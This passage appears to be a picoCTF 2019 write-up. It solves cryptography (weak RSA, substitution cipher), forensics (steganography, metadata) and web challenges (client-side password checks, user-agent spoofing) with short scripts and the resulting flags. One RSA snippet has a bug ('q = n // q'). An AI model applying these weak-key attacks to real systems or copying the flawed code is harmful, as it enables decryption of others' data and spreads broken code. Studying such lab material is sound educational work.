q : 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559
p : 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637
e : 65537
**PRODUCE THE FOLLOWING**
d
IS THIS POSSIBLE and FEASIBLE? (Y/N)

We are now asked to find the modular multiplicative inverse `d` given the two primes `p,q` and `e`. **This is feasible** as using `p,q` we can caluclate `\phi(n)` and using (`\phi(n),e`) we can find `d`.

Using python

```python
from Crypto.Util.number import inverse

p = 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637
q = 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559
phi = (p-1)*(q-1)
d = inverse(e,phi)
print(d)

1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729
```

### Question 8
>**NEW PROBLEM**
>p : 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433
ciphertext : 9200910993991342245635775242884295171331638486293398612829324409189786924964269448402231033692571666846582772547678361933884560304465448930040982507936200701552729919507681097344114739434382503801935689147981369024180959865358948150771814009412646368907358482273874756410640420832989566791308787895283057047604985049071797817308263226498433025719101414595141020534960745847160087741791305232083441121028428567136619357775442961508547402267425797890689191622526865196136020253867164299721963231711821169972573934532328410089925473599566951143246364545922038720537045119212022769806144414268754234300461988702406805390
e : 65537
n : 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239
#**PRODUCE THE FOLLOWING**
plaintext
IS THIS POSSIBLE and FEASIBLE? (Y/N)

Here we are given a ciphertext `c` to decode. As we are given `(n,p)` we can find `q`. As we are given `p,q,e` we can find `d`. As we have `c,d,n` we can find the plaintext `m` and so **this is feasible**.


```python
from Crypto.Util.number import inverse
c = 9200910993991342245635775242884295171331638486293398612829324409189786924964269448402231033692571666846582772547678361933884560304465448930040982507936200701552729919507681097344114739434382503801935689147981369024180959865358948150771814009412646368907358482273874756410640420832989566791308787895283057047604985049071797817308263226498433025719101414595141020534960745847160087741791305232083441121028428567136619357775442961508547402267425797890689191622526865196136020253867164299721963231711821169972573934532328410089925473599566951143246364545922038720537045119212022769806144414268754234300461988702406805390
n = 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239
e = 65537
p = 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433
q = n // q

phi = (p-1)*(q-1)
d = inverse(e,phi)
m = pow(c,d,n)

14311663942709674867122208214901970650496788151239520971623411712977119737614436391696347773
```

### Question 9

>If you convert the last plaintext to a hex number, then ascii, you'll find what you need! ;)

Given the integer from the plaintext, we convert the integer into base 16 and then decode the resulting string as ascii text

```python
m = 14311663942709674867122208214901970650496788151239520971623411712977119737614436391696347773
x = (bytes.fromhex(format(m,'x'))).decode('utf-8')

picoCTF{wA8_th4t$_ill3aGal..o6e437df2}
```

---

### MiniRSA
#### Points: 300

This RSA challenge is solved by noticing that `n` is a very large integer, while the cipher text is relatively small and the exponent is `e=3`. If the plaintext is unpadded, there's a good change we can recover the message by taking the cube root of `c`. 

I used mathematica for this because I'm lazy, but there are tutorials online for accurate calculations of cube roots. 

```
c = 2205316413931134031074603746928247799030155221252519872650090188613452564237125578465730267259964004717502122380246206889902726277183873277327660628860571110294829824875203511275589025377840116767106200804425285036496482998467992009084773

m = c^{1/3}

13016382529449106065894479374027604750406953699090365388203741824761323704182397
```

Heading over to python we can print the flag out

```python
x = (bytes.fromhex(format(m,'x')))
print(x)

b'picoCTF{n33d_a_lArg3r_e_e8e7052f}'
```


---


### waves over lambda 
#### Points: 300

We are given the following ciphertext

```
-------------------------------------------------------------------------------
flgiyorv utyt av mljy xdoi - xytwjtgfm_av_f_lnty_dopezo_nrfyxnnovl
-------------------------------------------------------------------------------
odtqtm xmlzlylnarfu coyopohln kov rut ruayz vlg lx xmlzly bondlnarfu coyopohln, o dogz lkgty ktdd cglkg ag ljy zavryafr ag uav lkg zom, ogz vradd ytptpetytz oplgi jv lkagi rl uav idllpm ogz ryoiaf ztoru, kuafu uobbtgtz ruayrttg mtoyv oil, ogz kuafu a vuodd ztvfyaet ag arv bylbty bdoft. xly rut bytvtgr a kadd lgdm vom ruor ruav dogzlkgtyxly vl kt jvtz rl fodd uap, odruljiu ut uoyzdm vbtgr o zom lx uav daxt lg uav lkg tvrortkov o vryogit rmbt, mtr lgt bytrrm xytwjtgrdm rl et ptr karu, o rmbt oestfr ogz nafaljv ogz or rut vopt rapt vtgvtdtvv. ejr ut kov lgt lx rulvt vtgvtdtvv btyvlgv kul oyt ntym ktdd foboedt lx dllcagi oxrty rutay klydzdm oxxoayv, ogz, obboytgrdm, oxrty glruagi tdvt. xmlzly bondlnarfu, xly agvrogft, etiog karu gtqr rl glruagi; uav tvrort kov lx rut vpoddtvr; ut yog rl zagt or lruty ptg'v roedtv, ogz xovrtgtz lg rutp ov o rlozm, mtr or uav ztoru ar obbtoytz ruor ut uoz o ujgzytz ruljvogz yljedtv ag uoyz fovu. or rut vopt rapt, ut kov odd uav daxt lgt lx rut plvr vtgvtdtvv, xogrovrafod xtddlkv ag rut kuldt zavryafr. a ytbtor, ar kov glr vrjbazarmrut poslyarm lx rutvt xogrovrafod xtddlkv oyt vuytkz ogz agrtddaitgr tgljiuejr sjvr vtgvtdtvvgtvv, ogz o btfjdaoy goralgod xlyp lx ar.
```

We simply run this through [Quipqiup](http://quipqiup.com). The whole thing can be solved if we include the fact that


>flgiyorv utyt av mljy xdoi - xytwjtgfm_av_f_lnty_dopezo = congrats here is your flag - frequency_is_c_over_lambda

#### Whole message

>congrats here is your flag - frequency_is_c_over_lambda_vtcrfvvaso 
>
>ale?ey fyodorovitch ?arama?ov was the third son of fyodor pavlovitch ?arama?ov, a land owner well ?nown in our district in his own day, and still remembered among us owing to his gloomy and tragic death, which happened thirteen years ago, and which i shall describe in its proper place. for the present i will only say that this landownerfor so we used to call him, although he hardly spent a day of his life on his own estatewas a strange type, yet one pretty frequently to be met with, a type ab?ect and vicious and at the same time senseless. but he was one of those senseless persons who are very well capable of loo?ing after their worldly affairs, and, apparently, after nothing else. fyodor pavlovitch, for instance, began with ne?t to nothing; his estate was of the smallest; he ran to dine at other men's tables, and fastened on them as a toady, yet at his death it appeared that he had a hundred thousand roubles in hard cash. at the same time, he was all his life one of the most senseless, fantastical fellows in the whole district. i repeat, it was not stupiditythe ma?ority of these fantastical fellows are shrewd and intelligent enoughbut ?ust senselessness, and a peculiar national form of it.

---

### b00tl3gRSA2
#### Points: 400


```python
from Crypto.Util.number import inverse

c = 56655071811218224302828848384519761929289839550855972427206791329461775512270676034900409928292898003845734257623136840362218584497862865087461886207069787597998446055905343532681334059721570425129696993455754319242507507674580943623854203561027603379347296171186617627184609486456236613031591207061561272676
n = 96636736570006391860399135193259732242595830552235523260510184668822655545791163241131054447802725748664426942000825437273461145584615972378451691053658609612366871910701324807748704651074817206221988255491891215446330838210841688047206350113325714155872264893985927297410857408238972581432853154511703458633
d = 65537
e = 2229500063992090948516463866399266294624485341028428386558606576731615044711174433077347976335165194195349398603922182296374158904495771094743716631416326465247179896288728731731743749544188582814097137843422447642427165304689108521723489356048403573469866596455857380956843922925692792779549591136186267041

def get_RSA_flag(c,n,d):
	m = pow(c,d,n)
	return bytes.fromhex(format(m,'x'))

print(get_RSA_flag(c,n,d))
```

picoCTF{bad_1d3a5_5533202}

---

### b00tl3gRSA3
#### Points: 450

```python
from Crypto.Util.number import inverse
from functools import reduce 

c = 32785287387291578099923635290567397410890995803165406332608626598853945807914414181493453637294623115826646562281645665578709210105299157632411423778216770019720138538795448041254766028454614540363936453124864182099849535264994127650408849641519946717113935340974782725913487563495839861003299413348283870125175211815526729778176684395863316322
n = 60681440696288151202766581746354942086205677757405573958398717055255341502335281742341920650344262358338433249212745194346281177671599825637699559577854444053241983437238464141112534065923487024960855855636711574040123082298738257833957092014476942190859115415267888599216201747328865168746986327311224996067215723466592014296734971352912153559
e = 65537

factors = [8680361201, 8810373757, 8879622217, 9279907993, 10593071891, 10722199157, 10723883981, 11096702983, 11202477151, 11216194933, 11502747821, 11747849147, 11916512249, 12266755343, 12342527563, 12657666379, 12946245071, 13198870877, 13567767419, 13687577677, 13759459261, 14809052347, 14840695949, 15173858627, 15417585367, 15654210233, 15797156117, 16087543081, 16300327081, 16311877493, 16463889749, 16653070583, 16751698741, 16845385849]

print(reduce((lambda x, y: x * y), factors) == n)

phi = 1

for f in factors:
	phi *= (f-1)

d = inverse(e,phi)
m = pow(c,d,n)
print(bytes.fromhex(format(m,'x')))
```

picoCTF{too_many_fact0rs_2020200}

---

### john_pollard
#### Points: 500

```
-----BEGIN CERTIFICATE-----
MIIB6zCB1AICMDkwDQYJKoZIhvcNAQECBQAwEjEQMA4GA1UEAxMHUGljb0NURjAe
Fw0xOTA3MDgwNzIxMThaFw0xOTA2MjYxNzM0MzhaMGcxEDAOBgNVBAsTB1BpY29D
VEYxEDAOBgNVBAoTB1BpY29DVEYxEDAOBgNVBAcTB1BpY29DVEYxEDAOBgNVBAgT
B1BpY29DVEYxCzAJBgNVBAYTAlVTMRAwDgYDVQQDEwdQaWNvQ1RGMCIwDQYJKoZI
hvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQABMA0GCSqGSIb3DQEBAgUAA4IBAQAH
al1hMsGeBb3rd/Oq+7uDguueopOvDC864hrpdGubgtjv/hrIsph7FtxM2B4rkkyA
eIV708y31HIplCLruxFdspqvfGvLsCynkYfsY70i6I/dOA6l4Qq/NdmkPDx7edqO
T/zK4jhnRafebqJucXFH8Ak+G6ASNRWhKfFZJTWj5CoyTMIutLU9lDiTXng3rDU1
BhXg04ei1jvAf0UrtpeOA6jUyeCLaKDFRbrOm35xI79r28yO8ng1UAzTRclvkORt
b8LMxw7e+vdIntBGqf7T25PLn/MycGPPvNXyIsTzvvY/MXXJHnAqpI5DlqwzbRHz
q16/S1WLvzg4PsElmv1f
-----END CERTIFICATE-----
```

Decoding the certificate ([link](https://8gwifi.org/PemParserFunctions.jsp)) the important information is given 

Key:  
RSA Public Key [68:0d:58:fa:65:c4:fc:08:fa:45:55:37:9d:3d:e0:19:ec:29:d6:6c]
modulus: 11a4d45212b17f
public exponent: 10001

We see that `n` is very, very small. We can factor this

```
n = 4966306421059967
p = 73176001
q = 67867967
```

picoCTF{73176001,67867967}

---

# Forensics

### unzip 
#### Points: 50 

Just unzip the file and the flag is in the image

picoCTF{unz1pp1ng_1s_3a5y}

---


### So Meta
#### Points: 150 


The flag is the "artist" of the image, found using `exiftool file`

Artist                          : picoCTF{s0_m3ta_74e57c5c}

---

### What Lies Within
#### Points: 150 

This is a steganography challenge. Looking at the LSB data of the file using zsteg we obtain:

```bash
b1,rgb,lsb,xy       .. text: "picoCTF{h1d1ng_1n_th3_b1t5}"
```

picoCTF{h1d1ng_1n_th3_b1t5}


---

### extensions 
#### Points: 150 

Opening the file we see that it is a hex encoding of a file. The beginning shows that the file is a `.png` and correctly converting the file we obtain the flag

picoCTF{now_you_know_about_extensions}

---

### WhitePages
#### Points: 250

We are given a text file encoded with two distinct whitespace characters. Replacing one with `0` and the other with `1` we get a binary representation of an ascii string

```
00001010000010010000100101110000011010010110001101101111010000110101010001000110000010100000101000001001000010010101001101000101010001010010000001010000010101010100001001001100010010010100001100100000010100100100010101000011010011110101001001000100010100110010000000100110001000000100001001000001010000110100101101000111010100100100111101010101010011100100010000100000010100100100010101010000010011110101001001010100000010100000100100001001001101010011000000110000001100000010000001000110011011110111001001100010011001010111001100100000010000010111011001100101001011000010000001010000011010010111010001110100011100110110001001110101011100100110011101101000001011000010000001010000010000010010000000110001001101010011001000110001001100110000101000001001000010010111000001101001011000110110111101000011010101000100011001111011011011100110111101110100010111110110000101101100011011000101111101110011011100000110000101100011011001010111001101011111011000010111001001100101010111110110001101110010011001010110000101110100011001010110010001011111011001010111000101110101011000010110110001011111001100110011000100110111001101010110000101100101001100110011100001100101001110010110011000110100001101010011011001100101011000010011000001100101001101100011001001100011011000010011000000110111001100100011011000110000011000100011011100110001011000010011001001111101000010100000100100001001
```
Decoding this binary to ascii, we obtain
```
picoCTF

		SEE PUBLIC RECORDS & BACKGROUND REPORT
		5000 Forbes Ave, Pittsburgh, PA 15213
		picoCTF{not_all_spaces_are_created_equal_3175ae38e9f456ea0e62ca07260b71a2}
```

picoCTF{not_all_spaces_are_created_equal_3175ae38e9f456ea0e62ca07260b71a2}


---

### m00nwalk
#### Points: 

This is an SSTV puzzle. Using the audio, with an RX mode of scottie was *just* able to make out the flag

picoCTF{beep_boop_im_in_space}

---

### pastaAAA 
#### Points: 350 

> This pasta is up to no good. There MUST be something behind it.

Using stegsolve, we can see written on the image 

picoCTF{pa$ta_1s_lyf3}

---

# Web


### Insp3ct0r
#### Points: 50

Search through the resources of the linked site to find the flag commented out

```
<!-- Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3 -->

/* You need CSS to make pretty pages. Here's part 2/3 of the flag: t3ct1ve_0r_ju5t */

/* Javascript sure is neat. Anyways part 3/3 of the flag: _lucky?d76327a1} */
```

picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?d76327a1}

---

### dont-use-client-side 
#### Points: 100

```javascript
function verify() {
    checkpass = document.getElementById("pass").value;
    split = 4;
    if (checkpass.substring(0, split) == 'pico') {
      if (checkpass.substring(split*6, split*7) == '4454') {
        if (checkpass.substring(split, split*2) == 'CTF{') {
         if (checkpass.substring(split*4, split*5) == 'ts_p') {
          if (checkpass.substring(split*3, split*4) == 'lien') {
            if (checkpass.substring(split*5, split*6) == 'lz_2') {
              if (checkpass.substring(split*2, split*3) == 'no_c') {
                if (checkpass.substring(split*7, split*8) == 'a}') {
                  alert("Password Verified")
                  }
                }
              }
      
            }
          }
        }
      }
    }
    else {
      alert("Incorrect password");
    } 
  }
```

Piecing this together, we obtain the flag

picoCTF{no_clients_plz_24454a}

---

### where are the robots
#### Points: 100

Hint towards looking at robots.txt

https://2019shell1.picoctf.com/problem/47235/robots.txt

Which hints towards

https://2019shell1.picoctf.com/problem/47235/a262d.html

This page has the flag

picoCTF{ca1cu1at1ng_Mach1n3s_a262d}

--- 

### Client-side-again 
#### Points: 200

Cleaning up the source

```javascript
  function verify() {
   checkpass = document[_0x4b5b('0x0')]('pass')[_0x4b5b('0x1')];
   split = 0x4;
   if (checkpass[_0x4b5b('0x2')](0x0, split * 0x2) == _0x4b5b('0x3')) {
    if (checkpass[_0x4b5b('0x2')](0x7, 0x9) == '{n') {
     if (checkpass[_0x4b5b('0x2')](split * 0x2, split * 0x2 * 0x2) == _0x4b5b('0x4')) {
      if (checkpass[_0x4b5b('0x2')](0x3, 0x6) == 'oCT') {
       if (checkpass[_0x4b5b('0x2')](split * 0x3 * 0x2, split * 0x4 * 0x2) == _0x4b5b('0x5')) {
        if (checkpass['substring'](0x6, 0xb) == 'F{not') {
         if (checkpass[_0x4b5b('0x2')](split * 0x2 * 0x2, split * 0x3 * 0x2) == _0x4b5b('0x6')) {
          if (checkpass[_0x4b5b('0x2')](0xc, 0x10) == _0x4b5b('0x7')) {
           alert(_0x4b5b('0x8'));
          }
         }
        }
       }
      }
     }
    }
   } else {
    alert(_0x4b5b('0x9'));
   }
  }
```

picoCTF{not_this_again_6c2047}


---

### picobrowser 
#### Points: 200 

Set user agent to "picobrowser" and visit the page to obtain the flag

picoCTF{p1c0_s3cr3t_ag3nt_665ad8a4}

---

### Java Script Kiddie
#### Points: 400

Using the code from the source, together with the known 16 bytes of a png header

```
89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52
```

We can have a fairly ugly function which tells us the output
```js
var bytes = [41, 117, 233, 27, 252, 188, 0, 146, 149, 206, 140, 223, 159, 37, 68, 82, 240, 74, 246, 255, 247, 0, 26, 8, 0, 69, 255, 6, 178, 248, 95, 108, 152, 241, 198, 71, 119, 10, 1, 182, 223, 0, 78, 68, 73, 23, 106, 228, 171, 46, 132, 114, 194, 0, 68, 190, 62, 0, 0, 13, 213, 1, 152, 35, 18, 80, 78, 2, 111, 73, 122, 252, 239, 120, 0, 0, 150, 66, 22, 146, 32, 0, 1, 191, 0, 9, 165, 234, 73, 14, 156, 237, 190, 72, 126, 40, 183, 0, 0, 110, 13, 29, 237, 198, 0, 96, 144, 163, 174, 192, 111, 188, 103, 16, 134, 153, 0, 192, 75, 0, 1, 106, 45, 27, 73, 75, 220, 223, 137, 57, 82, 139, 151, 21, 154, 10, 84, 132, 209, 248, 0, 55, 4, 85, 0, 157, 132, 255, 26, 94, 62, 114, 67, 92, 131, 241, 155, 106, 62, 247, 164, 174, 87, 49, 96, 99, 170, 65, 208, 234, 111, 71, 200, 45, 245, 24, 48, 198, 27, 112, 73, 170, 64, 41, 161, 71, 12, 58, 100, 27, 124, 221, 133, 59, 234, 87, 242, 206, 193, 15, 190, 245, 235, 49, 241, 198, 198, 223, 220, 17, 157, 223, 39, 11, 233, 137, 100, 184, 170, 136, 198, 15, 244, 189, 74, 77, 207, 15, 126, 23, 226, 63, 170, 99, 120, 37, 64, 99, 94, 102, 241, 13, 239, 160, 170, 6, 197, 121, 249, 62, 113, 124, 101, 189, 35, 190, 141, 143, 241, 126, 33, 63, 34, 170, 83, 17, 41, 132, 126, 66, 244, 24, 96, 143, 223, 106, 221, 37, 176, 111, 105, 249, 25, 0, 248, 253, 233, 246, 8, 191, 155, 132, 231, 2, 170, 146, 238, 231, 71, 235, 15, 245, 182, 160, 191, 49, 159, 45, 64, 162, 111, 41, 66, 153, 66, 11, 0, 71, 121, 17, 87, 239, 125, 211, 227, 211, 235, 87, 17, 172, 160, 205, 107, 126, 84, 158, 89, 45, 79, 157, 146, 132, 218, 132, 111, 255, 251, 82, 178, 253, 204, 254, 151, 150, 80, 181, 134, 81, 241, 39, 166, 23, 30, 150, 49, 234, 234, 76, 144, 64, 156, 245, 126, 174, 231, 34, 172, 104, 33, 89, 236, 187, 97, 70, 198, 217, 3, 255, 119, 31, 24, 136, 63, 234, 207, 234, 166, 151, 99, 252, 191, 156, 114, 233, 234, 245, 5, 214, 55, 191, 44, 114, 181, 123, 244, 24, 172, 250, 141, 244, 191, 21, 255, 252, 156, 29, 214, 191, 151, 245, 122, 77, 19, 66, 139, 202, 64, 90, 223, 222, 90, 24, 72, 156, 253, 91, 65, 184, 226, 23, 209, 6, 20, 223, 107, 79, 106, 14, 90, 186, 139, 11, 161, 244, 222, 249, 220, 227, 61, 229, 123, 171, 17, 61, 205, 190, 210, 208, 242, 189, 110, 21, 159, 160, 124, 214, 90, 69, 91, 126, 50, 134, 197, 31, 148, 236, 212, 163, 30, 73, 220, 236, 8, 191, 114, 206, 35, 190, 246, 150, 125, 111, 8, 254, 26, 10, 104, 169, 80, 88, 239, 196, 206, 234, 245, 90, 171, 59, 3, 176, 174, 243, 183, 249, 49, 214, 155, 92, 215, 1, 14, 207, 251, 8, 191, 153, 79, 177, 37, 194, 250, 179, 49, 243, 165, 70, 150, 99, 102, 184, 188, 96, 231, 227, 244, 60, 111, 233, 35, 155, 185, 247, 231, 20, 73, 160, 138, 255, 97, 200, 249, 239, 246, 234, 130, 93, 88, 183, 223, 45, 223, 115, 33, 89, 127, 5, 193, 69, 174, 207, 49, 252, 33, 13, 33, 214, 241, 219, 63, 127, 15, 112, 249, 177, 17, 225, 187, 61, 67, 248, 109, 115, 175, 105, 10, 200, 79, 167, 152, 100, 73, 144, 110, 91, 245, 24, 50, 117, 182, 253, 51, 211, 105, 39, 215, 22, 249, 249, 125, 93, 167, 220, 174, 253, 158, 61, 202, 121, 89, 99, 112, 131, 207, 214, 99, 83, 188, 166, 151, 49, 116, 8, 155, 239, 247, 31, 45, 39, 111, 63, 224, 78, 106, 207, 187, 143, 251, 127, 120, 247, 210, 220, 130, 211, 7, 209, 72, 173, 73, 227, 191, 23, 121, 222, 166, 131, 242, 5, 181, 124, 241, 147, 68, 122, 249, 45, 87, 89, 96, 130];

$.get("bytes", function(resp) {
	bytes = Array.from(resp.split(" "), x => Number(x));
});

function assemble_png(u_in){
	var LEN = 16;
	var key = "0000000000000000";
	var shifter;
	if(u_in.length == LEN){
		key = u_in;
	}
	var result = [];
	for(var i = 0; i < LEN; i++){
		shifter = key.charCodeAt(i) - 48;
		for(var j = 0; j < (bytes.length / LEN); j ++){
			result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
		}
	}
	while(result[result.length-1] == 0){
		result = result.slice(0,result.length-1);
	}
  console.log(result.slice(0,16))
  return false;
}

u_in = "8442621862337500"
assemble_png(u_in);

var desired = [137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82]

Output:
(16)[137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82]
```

Trial and error for all 16 bytes gives us the key

`8442621862337500`

and using this password on the site, we are given a QR code. When scanned gives the flag

picoCTF{65df43eff650d95dc1a21fef00d3d1b0}

---

### Java Script Kiddie 2
#### Points: 450

```js
var bytes = [150, 142, 202, 248, 111, 246, 218, 255, 230, 162, 68, 114, 195, 254, 68, 170, 166, 26, 168, 39, 255, 252, 145, 255, 188, 207, 171, 223, 214, 78, 0, 49, 66, 96, 130, 229, 120, 109, 7, 137, 222, 63, 225, 255, 7, 0, 68, 191, 137, 80, 78, 90, 212, 227, 143, 2, 0, 120, 71, 73, 69, 72, 95, 255, 0, 0, 1, 199, 0, 163, 141, 81, 0, 0, 0, 0, 0, 192, 138, 65, 164, 0, 0, 62, 13, 0, 25, 127, 0, 0, 153, 13, 73, 65, 200, 250, 48, 16, 69, 0, 0, 10, 0, 55, 1, 0, 227, 0, 0, 55, 139, 128, 66, 142, 52, 71, 122, 0, 26, 0, 84, 0, 0, 237, 154, 63, 20, 174, 108, 185, 135, 114, 69, 73, 1, 0, 144, 120, 0, 81, 212, 91, 141, 0, 126, 149, 84, 2, 176, 134, 68, 10, 24, 3, 0, 13, 50, 227, 14, 82, 222, 120, 227, 127, 97, 143, 94, 114, 146, 144, 0, 49, 246, 166, 25, 108, 36, 34, 183, 55, 16, 136, 50, 65, 219, 170, 156, 192, 120, 36, 140, 220, 215, 177, 159, 153, 127, 159, 199, 202, 29, 167, 244, 128, 220, 124, 199, 145, 153, 159, 178, 146, 252, 139, 137, 7, 143, 48, 151, 243, 129, 216, 60, 146, 99, 252, 23, 141, 240, 187, 151, 177, 146, 241, 133, 255, 234, 222, 151, 124, 62, 127, 227, 169, 229, 36, 29, 241, 160, 228, 112, 0, 212, 250, 215, 55, 142, 205, 199, 5, 225, 134, 0, 28, 126, 179, 246, 185, 188, 142, 193, 192, 0, 112, 234, 67, 209, 249, 89, 152, 123, 22, 59, 167, 139, 60, 255, 203, 33, 62, 60, 241, 125, 61, 66, 71, 39, 7, 150, 250, 8, 80, 198, 223, 14, 29, 175, 55, 218, 249, 126, 138, 223, 160, 0, 162, 94, 254, 147, 230, 16, 234, 223, 248, 191, 197, 162, 145, 217, 248, 17, 254, 253, 121, 6, 157, 254, 109, 141, 223, 173, 64, 103, 24, 251, 242, 132, 62, 91, 29, 82, 152, 245, 185, 77, 202, 83, 202, 146, 175, 162, 109, 90, 247, 76, 103, 185, 187, 152, 127, 155, 119, 245, 71, 185, 203, 76, 168, 15, 229, 186, 172, 139, 17, 219, 32, 191, 108, 69, 217, 50, 195, 112, 192, 55, 70, 101, 39, 129, 86, 166, 111, 123, 47, 81, 75, 39, 52, 74, 212, 15, 85, 143, 212, 207, 127, 250, 111, 155, 30, 223, 121, 71, 186, 114, 77, 95, 147, 131, 214, 53, 100, 242, 165, 238, 228, 213, 181, 53, 144, 149, 88, 170, 4, 173, 55, 115, 96, 233, 219, 32, 244, 163, 127, 245, 14, 148, 202, 169, 237, 216, 69, 40, 127, 183, 93, 190, 124, 208, 127, 171, 148, 83, 127, 50, 116, 212, 95, 83, 233, 227, 243, 49, 252, 204, 69, 57, 58, 178, 49, 70, 217, 206, 135, 92, 210, 115, 13, 243, 2, 152, 175, 244, 5, 32, 146, 205, 126, 62, 27, 169, 201, 109, 32, 245, 191, 31, 143, 202, 248, 197, 223, 172, 63, 210, 137, 62, 205, 18, 226, 12, 200, 163, 190, 246, 224, 38, 196, 108, 77, 144, 84, 191, 182, 239, 203, 215, 126, 248, 252, 244, 44, 223, 254, 27, 206, 127, 54, 7, 211, 150, 87, 255, 111, 223, 224, 36, 181, 65, 135, 69, 195, 124, 83, 205, 183, 223, 19, 194, 56, 55, 133, 124, 223, 96, 101, 186, 103, 90, 171, 164, 39, 50, 109, 22, 192, 234, 87, 227, 162, 245, 21, 117, 1, 224, 229, 124, 118, 2, 88, 246, 197, 151, 235, 234, 140, 198, 0, 175, 87, 235, 215, 220, 75, 176, 57, 228, 150, 182, 120, 18, 53, 175, 239, 13, 67, 116, 192, 198, 198, 196, 185, 227, 83, 26, 255, 76, 101, 9, 207, 145, 71, 140, 254, 44, 106, 31, 143, 247, 94, 43, 86, 109, 49, 71, 62, 38, 251, 147, 139, 85, 76, 82, 184, 179, 196, 35, 249, 159, 62, 177, 252, 203, 57, 91, 117, 147, 124, 222, 28, 23, 255, 57, 130, 24, 149, 255, 92, 127, 71, 162, 91, 55, 48];

function assemble_png(u_in){
	var LEN = 16;
	var key = "00000000000000000000000000000000";
	var shifter;
	if(u_in.length == key.length){
		key = u_in;
	}
	var result = [];
	for(var i = 0; i < LEN; i++){
		shifter = Number(key.slice((i*2),(i*2)+1));
		for(var j = 0; j < (bytes.length / LEN); j ++){
			result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
		}
	}
	while(result[result.length-1] == 0){
		result = result.slice(0,result.length-1);
	}
	// console.log(result.slice(0,16))
	return result.slice(0,16);
}

var desired = [137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82]

var test = "30303070506070905a6b9c5d50302e90";
result = assemble_png(test)

console.log(result)

// 3
// 3
// 3
// 7
// 5
// 6
// 7
// 9
// 3,4,5
// 4,5,6,7
// 4,7,8,9
// 5,9
// 5
// 3
// 0,2
// 9

solution 

// 30303070506070905a6b9c5d50302e90
```

picoCTF{ec4fe193b0ebd7e2c20e701f493263d6}

--- 
